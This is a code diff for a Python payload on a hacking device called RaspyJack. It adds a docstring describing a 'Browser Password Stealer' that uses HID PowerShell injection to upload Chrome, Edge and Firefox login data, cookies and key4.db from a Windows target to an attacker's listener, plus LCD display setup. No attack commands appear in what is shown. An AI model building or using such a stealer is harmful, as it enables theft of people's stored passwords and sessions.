@@ -1,4 +1,34 @@
 #!/usr/bin/env python3
+"""
+RaspyJack *payload* – **Browser Password Stealer**
+================================================
+This payload attempts to exfiltrate browser login data (passwords, cookies, etc.)
+from a target Windows machine using a HID attack (PowerShell injection).
+It requires a listener (e.g., a simple Python HTTP server) on the specified IP
+and port to receive the exfiltrated files.
+
+Features:
+- Configurable listener IP and Port via LCD input.
+- Injects PowerShell commands via HID to locate and upload browser data.
+- Supports Chrome, Edge, and Firefox (login data, key4.db).
+- Displays attack status on the LCD.
+- Graceful exit via KEY3 or Ctrl-C.
+
+Controls:
+- MAIN SCREEN:
+    - OK: Start/Enter Listener IP
+    - KEY3: Exit Payload
+- IP INPUT SCREEN:
+    - UP/DOWN: Change digit at cursor position
+    - LEFT/RIGHT: Move cursor
+    - OK: Confirm IP and proceed to Port input
+    - KEY3: Cancel IP input and return to main screen
+- PORT INPUT SCREEN:
+    - UP/DOWN: Change digit at cursor position
+    - LEFT/RIGHT: Move cursor
+    - OK: Confirm Port and start attack
+    - KEY3: Cancel Port input and return to main screen
+"""
 import sys
 import os
 import time
@@ -19,6 +49,7 @@ LCD = LCD_1in44.LCD()
 LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
 FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
 FONT = ImageFont.load_default()
+WIDTH, HEIGHT = 128, 128
 
 running = True
 current_ip_input = LISTENER_IP
